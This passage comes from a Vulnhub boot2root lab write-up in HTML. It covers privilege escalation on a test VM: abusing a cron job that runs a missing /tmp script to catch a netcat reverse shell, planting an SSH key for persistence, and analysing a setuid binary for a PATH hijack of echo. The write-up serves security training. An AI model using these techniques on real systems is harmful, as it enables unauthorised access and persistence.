<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">hadi</span><span class="w"> </span><span class="n">hadi</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="mi">0</span><span class="n">K</span><span class="w"> </span><span class="n">mai</span><span class="w">    </span><span class="mi">1</span><span class="w">  </span><span class="mi">2017</span><span class="w"> </span><span class="p">.</span><span class="n">ssh</span>
<span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span>
</code></pre></div>
<p>Okay we got a program <code>buff</code> owned by root and and file <code>buff.c</code> readable by anybody but there is no suid, so no need to bother here.
<code>martin@debian:/home/hadi$ ls -laRh /etc/cron.d</code> doesn't get us something useful but <code>cat /etc/crontab</code> seems usable:</p>
<div class="highlight"><pre><span></span><code><span class="n">martin</span><span class="nv">@debian</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">hadi</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">crontab</span><span class="w"> </span>
<span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span>
<span class="n">SHELL</span><span class="o">=/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span>
<span class="k">PATH</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="nl">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="nl">bin</span><span class="p">:</span><span class="o">/</span><span class="nl">sbin</span><span class="p">:</span><span class="o">/</span><span class="nl">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nl">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span>

<span class="err">#</span><span class="w"> </span><span class="n">m</span><span class="w"> </span><span class="n">h</span><span class="w"> </span><span class="n">dom</span><span class="w"> </span><span class="n">mon</span><span class="w"> </span><span class="n">dow</span><span class="w"> </span><span class="k">user</span><span class="w">  </span><span class="n">command</span>
<span class="mi">17</span><span class="w"> </span><span class="o">*</span><span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w">   </span><span class="n">root</span><span class="w">    </span><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">run</span><span class="o">-</span><span class="n">parts</span><span class="w"> </span><span class="o">--</span><span class="n">report</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="p">.</span><span class="n">hourly</span>
<span class="mi">25</span><span class="w"> </span><span class="mi">6</span><span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w">   </span><span class="n">root</span><span class="w">    </span><span class="n">test</span><span class="w"> </span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">anacron</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">run</span><span class="o">-</span><span class="n">parts</span><span class="w"> </span><span class="o">--</span><span class="n">report</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="p">.</span><span class="n">daily</span><span class="w"> </span><span class="p">)</span>
<span class="mi">47</span><span class="w"> </span><span class="mi">6</span><span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">7</span><span class="w">   </span><span class="n">root</span><span class="w">    </span><span class="n">test</span><span class="w"> </span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">anacron</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">run</span><span class="o">-</span><span class="n">parts</span><span class="w"> </span><span class="o">--</span><span class="n">report</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="p">.</span><span class="n">weekly</span><span class="w"> </span><span class="p">)</span>
<span class="mi">52</span><span class="w"> </span><span class="mi">6</span><span class="w">    </span><span class="mi">1</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w">   </span><span class="n">root</span><span class="w">    </span><span class="n">test</span><span class="w"> </span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">anacron</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">run</span><span class="o">-</span><span class="n">parts</span><span class="w"> </span><span class="o">--</span><span class="n">report</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="p">.</span><span class="n">monthly</span><span class="w"> </span><span class="p">)</span>
<span class="o">*/</span><span class="mi">5</span><span class="w">   </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w">   </span><span class="n">jimmy</span><span class="w">   </span><span class="n">python</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">sekurity</span><span class="p">.</span><span class="n">py</span>
</code></pre></div>
<p>Of course the script launch by jimmy in <code>tmp</code> doesn't exist. We create one with a simple python reverse shell <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentest monkey</a>:</p>
<div class="highlight"><pre><span></span><code>root@kalili:~# nc -l -p 1234
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1002(jimmy) gid=1002(jimmy) groupes=1002(jimmy)
</code></pre></div>
<p>We add our ssh key to be able to connect with ssh:</p>
<div class="highlight"><pre><span></span><code><span class="nv">$</span><span class="w"> </span><span class="nv">cd</span><span class="w"> </span><span class="sr">/home/</span><span class="n">jimmy</span>
<span class="nv">$</span><span class="w"> </span><span class="nv">mkdir</span><span class="w"> </span><span class="o">.</span><span class="n">ssh</span>
<span class="nv">$</span><span class="w"> </span><span class="nv">cat</span><span class="w"> </span><span class="sr">/home/m</span><span class="n">artin</span><span class="sr">/.ssh/</span><span class="n">authorized_keys</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">authorized_keys</span>
</code></pre></div>
<p>There is binary <code>networker</code> owned by root with an suid in our home directory (well jimmy's):</p>
<div class="highlight"><pre><span></span><code><span class="n">jimmy</span><span class="nv">@debian</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">al</span>
<span class="n">total</span><span class="w"> </span><span class="mi">36</span>
<span class="n">drwx</span><span class="o">------</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="n">jimmy</span><span class="w"> </span><span class="n">jimmy</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="n">nov</span><span class="p">.</span><span class="w">  </span><span class="mi">17</span><span class="w"> </span><span class="mi">10</span><span class="err">:</span><span class="mi">30</span><span class="w"> </span><span class="p">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="n">root</span><span class="w">  </span><span class="n">root</span><span class="w">  </span><span class="mi">4096</span><span class="w"> </span><span class="n">juin</span><span class="w">   </span><span class="mi">9</span><span class="w"> </span><span class="mi">20</span><span class="err">:</span><span class="mi">17</span><span class="w"> </span><span class="p">..</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w">  </span><span class="n">root</span><span class="w">    </span><span class="mi">16</span><span class="w"> </span><span class="n">juin</span><span class="w">   </span><span class="mi">9</span><span class="w"> </span><span class="mi">20</span><span class="err">:</span><span class="mi">40</span><span class="w"> </span><span class="p">.</span><span class="n">bash_history</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">jimmy</span><span class="w"> </span><span class="n">jimmy</span><span class="w">  </span><span class="mi">220</span><span class="w"> </span><span class="n">juin</span><span class="w">   </span><span class="mi">8</span><span class="w"> </span><span class="mi">21</span><span class="err">:</span><span class="mi">07</span><span class="w"> </span><span class="p">.</span><span class="n">bash_logout</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">jimmy</span><span class="w"> </span><span class="n">jimmy</span><span class="w"> </span><span class="mi">3515</span><span class="w"> </span><span class="n">juin</span><span class="w">   </span><span class="mi">8</span><span class="w"> </span><span class="mi">21</span><span class="err">:</span><span class="mi">07</span><span class="w"> </span><span class="p">.</span><span class="n">bashrc</span>
<span class="o">-</span><span class="n">rwsrwxrwx</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w">  </span><span class="n">root</span><span class="w">  </span><span class="mi">7496</span><span class="w"> </span><span class="n">juin</span><span class="w">   </span><span class="mi">9</span><span class="w"> </span><span class="mi">20</span><span class="err">:</span><span class="mi">00</span><span class="w"> </span><span class="n">networker</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">jimmy</span><span class="w"> </span><span class="n">jimmy</span><span class="w">  </span><span class="mi">675</span><span class="w"> </span><span class="n">juin</span><span class="w">   </span><span class="mi">8</span><span class="w"> </span><span class="mi">21</span><span class="err">:</span><span class="mi">07</span><span class="w"> </span><span class="p">.</span><span class="n">profile</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">jimmy</span><span class="w"> </span><span class="n">jimmy</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="n">nov</span><span class="p">.</span><span class="w">  </span><span class="mi">17</span><span class="w"> </span><span class="mi">10</span><span class="err">:</span><span class="mi">31</span><span class="w"> </span><span class="p">.</span><span class="n">ssh</span>
</code></pre></div>
<p>It seems to give information about the network configuration, ping localhost and and echo "echo linux tool version 5":</p>
<div class="highlight"><pre><span></span><code><span class="n">jimmy</span><span class="err">@</span><span class="n">debian</span><span class="p">:</span><span class="o">~$</span><span class="w"> </span><span class="o">./</span><span class="n">networker</span><span class="w"> </span>
<span class="o">***</span><span class="w"> </span><span class="n">Networker</span><span class="w"> </span><span class="mf">2.0</span><span class="w"> </span><span class="o">***</span><span class="w"> </span>
<span class="n">eth0</span><span class="w">      </span><span class="n">Link</span><span class="w"> </span><span class="n">encap</span><span class="p">:</span><span class="n">Ethernet</span><span class="w">  </span><span class="n">HWaddr</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">84</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="n">c4</span><span class="w">  </span>
<span class="w">    </span><span class="n">inet</span><span class="w"> </span><span class="n">adr</span><span class="p">:</span><span class="mf">10.0</span><span class="o">.</span><span class="mf">2.5</span><span class="w">  </span><span class="n">Bcast</span><span class="p">:</span><span class="mf">10.0</span><span class="o">.</span><span class="mf">2.255</span><span class="w">  </span><span class="n">Masque</span><span class="p">:</span><span class="mf">255.255</span><span class="o">.</span><span class="mf">255.0</span>
<span class="w">    </span><span class="n">adr</span><span class="w"> </span><span class="n">inet6</span><span class="p">:</span><span class="w"> </span><span class="n">fe80</span><span class="p">::</span><span class="n">a00</span><span class="p">:</span><span class="mi">27</span><span class="n">ff</span><span class="p">:</span><span class="n">fe84</span><span class="p">:</span><span class="mi">43</span><span class="n">c4</span><span class="o">/</span><span class="mi">64</span><span class="w"> </span><span class="n">Scope</span><span class="p">:</span><span class="n">Lien</span>
<span class="w">    </span><span class="n">UP</span><span class="w"> </span><span class="n">BROADCAST</span><span class="w"> </span><span class="n">RUNNING</span><span class="w"> </span><span class="n">MULTICAST</span><span class="w">  </span><span class="n">MTU</span><span class="p">:</span><span class="mi">1500</span><span class="w">  </span><span class="n">Metric</span><span class="p">:</span><span class="mi">1</span>
<span class="w">    </span><span class="n">RX</span><span class="w"> </span><span class="n">packets</span><span class="p">:</span><span class="mi">3934</span><span class="w"> </span><span class="n">errors</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="n">dropped</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="n">overruns</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="n">frame</span><span class="p">:</span><span class="mi">0</span>
<span class="w">    </span><span class="n">TX</span><span class="w"> </span><span class="n">packets</span><span class="p">:</span><span class="mi">2705</span><span class="w"> </span><span class="n">errors</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="n">dropped</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="n">overruns</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="n">carrier</span><span class="p">:</span><span class="mi">0</span>
<span class="w">    </span><span class="n">collisions</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="n">lg</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="n">transmission</span><span class="p">:</span><span class="mi">1000</span><span class="w"> </span>
<span class="w">    </span><span class="n">RX</span><span class="w"> </span><span class="n">bytes</span><span class="p">:</span><span class="mi">331724</span><span class="w"> </span><span class="p">(</span><span class="mf">323.9</span><span class="w"> </span><span class="n">KiB</span><span class="p">)</span><span class="w">  </span><span class="n">TX</span><span class="w"> </span><span class="n">bytes</span><span class="p">:</span><span class="mi">398743</span><span class="w"> </span><span class="p">(</span><span class="mf">389.3</span><span class="w"> </span><span class="n">KiB</span><span class="p">)</span>
<span class="w">    </span><span class="n">Interruption</span><span class="p">:</span><span class="mi">9</span><span class="w"> </span><span class="n">Adresse</span><span class="w"> </span><span class="n">de</span><span class="w"> </span><span class="n">base</span><span class="p">:</span><span class="mh">0xd020</span>

<span class="n">lo</span><span class="w">        </span><span class="n">Link</span><span class="w"> </span><span class="n">encap</span><span class="p">:</span><span class="n">Boucle</span><span class="w"> </span><span class="n">locale</span><span class="w">  </span>
<span class="w">    </span><span class="n">inet</span><span class="w"> </span><span class="n">adr</span><span class="p">:</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="w">  </span><span class="n">Masque</span><span class="p">:</span><span class="mf">255.0</span><span class="o">.</span><span class="mf">0.0</span>
<span class="w">    </span><span class="n">adr</span><span class="w"> </span><span class="n">inet6</span><span class="p">:</span><span class="w"> </span><span class="p">::</span><span class="mi">1</span><span class="o">/</span><span class="mi">128</span><span class="w"> </span><span class="n">Scope</span><span class="p">:</span><span class="n">Hôte</span>
<span class="w">    </span><span class="n">UP</span><span class="w"> </span><span class="n">LOOPBACK</span><span class="w"> </span><span class="n">RUNNING</span><span class="w">  </span><span class="n">MTU</span><span class="p">:</span><span class="mi">65536</span><span class="w">  </span><span class="n">Metric</span><span class="p">:</span><span class="mi">1</span>
<span class="w">    </span><span class="n">RX</span><span class="w"> </span><span class="n">packets</span><span class="p">:</span><span class="mi">6</span><span class="w"> </span><span class="n">errors</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="n">dropped</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="n">overruns</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="n">frame</span><span class="p">:</span><span class="mi">0</span>
<span class="w">    </span><span class="n">TX</span><span class="w"> </span><span class="n">packets</span><span class="p">:</span><span class="mi">6</span><span class="w"> </span><span class="n">errors</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="n">dropped</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="n">overruns</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="n">carrier</span><span class="p">:</span><span class="mi">0</span>
<span class="w">    </span><span class="n">collisions</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="n">lg</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="n">transmission</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span>
<span class="w">    </span><span class="n">RX</span><span class="w"> </span><span class="n">bytes</span><span class="p">:</span><span class="mi">504</span><span class="w"> </span><span class="p">(</span><span class="mf">504.0</span><span class="w"> </span><span class="n">B</span><span class="p">)</span><span class="w">  </span><span class="n">TX</span><span class="w"> </span><span class="n">bytes</span><span class="p">:</span><span class="mi">504</span><span class="w"> </span><span class="p">(</span><span class="mf">504.0</span><span class="w"> </span><span class="n">B</span><span class="p">)</span>

<span class="n">PING</span><span class="w"> </span><span class="n">localhost</span><span class="w"> </span><span class="p">(</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">)</span><span class="w"> </span><span class="mi">56</span><span class="p">(</span><span class="mi">84</span><span class="p">)</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">data</span><span class="o">.</span>
<span class="mi">64</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">localhost</span><span class="w"> </span><span class="p">(</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">):</span><span class="w"> </span><span class="n">icmp_seq</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="n">ttl</span><span class="o">=</span><span class="mi">64</span><span class="w"> </span><span class="n">time</span><span class="o">=</span><span class="mf">0.012</span><span class="w"> </span><span class="n">ms</span>

<span class="o">---</span><span class="w"> </span><span class="n">localhost</span><span class="w"> </span><span class="n">ping</span><span class="w"> </span><span class="n">statistics</span><span class="w"> </span><span class="o">---</span>
<span class="mi">1</span><span class="w"> </span><span class="n">packets</span><span class="w"> </span><span class="n">transmitted</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">received</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="o">%</span><span class="w"> </span><span class="n">packet</span><span class="w"> </span><span class="n">loss</span><span class="p">,</span><span class="w"> </span><span class="n">time</span><span class="w"> </span><span class="mi">0</span><span class="n">ms</span>
<span class="n">rtt</span><span class="w"> </span><span class="nb">min</span><span class="o">/</span><span class="n">avg</span><span class="o">/</span><span class="nb">max</span><span class="o">/</span><span class="n">mdev</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0.012</span><span class="o">/</span><span class="mf">0.012</span><span class="o">/</span><span class="mf">0.012</span><span class="o">/</span><span class="mf">0.000</span><span class="w"> </span><span class="n">ms</span>
<span class="n">Done</span><span class="w"> </span>
<span class="n">echo</span><span class="w"> </span><span class="n">linux</span><span class="w"> </span><span class="k">tool</span><span class="w"> </span><span class="n">version</span><span class="w"> </span><span class="mi">5</span>
<span class="n">Vous</span><span class="w"> </span><span class="n">avez</span><span class="w"> </span><span class="n">du</span><span class="w"> </span><span class="n">nouveau</span><span class="w"> </span><span class="n">courrier</span><span class="w"> </span><span class="n">dans</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">mail</span><span class="o">/</span><span class="n">jimmy</span>
</code></pre></div>
<p>Getting the strings in the program give us the following:</p>
<div class="highlight"><pre><span></span><code><span class="n">jimmy</span><span class="err">@</span><span class="n">debian</span><span class="p">:</span><span class="o">~$</span><span class="w"> </span><span class="n">strings</span><span class="w"> </span><span class="n">networker</span><span class="w"> </span>
<span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span>
<span class="o">***</span><span class="w"> </span><span class="n">Networker</span><span class="w"> </span><span class="mf">2.0</span><span class="w"> </span><span class="o">***</span><span class="w"> </span>
<span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">ifconfig</span>
<span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">ping</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="mi">1</span><span class="w">  </span><span class="n">localhost</span><span class="w"> </span>
<span class="n">Done</span><span class="w"> </span>
<span class="n">echo</span><span class="w"> </span><span class="s1">'echo linux tool version 5'</span>
<span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span>
</code></pre></div>
<p>So <code>ping</code> and <code>ifconfig</code> seem to be loaded from an absolute path but not the <code>echo</code> command. We shall be able to
make our own echo binary and change the path to execute our binary (a reverse shell) instead of echo.</p>
<p>But the binary use the absolute path and we didn't achieve to be root.
Let me know if you were able to get root from there (no bruteforce on the hadi user :D).</p>
<p>Thanks to Hadi for the VM and thanks to vulnhub.</p>
</div>
<div class="tag-cloud">
<p>
<a href="../../tag/security.html">security</a>
<a href="../../tag/vulnhub.html">vulnhub</a>
<a href="../../tag/boot2root.html">boot2root</a>
<a href="../../tag/linux.html">linux</a>
</p>
</div>
<div class="neighbors">
<a class="btn float-left" href="../../2017/11/vulnhub-bulldog-1.html" title="Vulnhub, Bulldog: 1">
<i class="fa fa-angle-left"></i> Previous Post
    </a>
<a class="btn float-right" href="../../2018/10/flare-on-challenge-2018.html" title="Flare-on Challenge 2018">
      Next Post <i class="fa fa-angle-right"></i>
</a>
</div>
</article>
<footer>
<p>
  © 2024  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
</script>
</p><p>
<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
</img></a>
</p></footer> </main>
<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>
</body>
</html>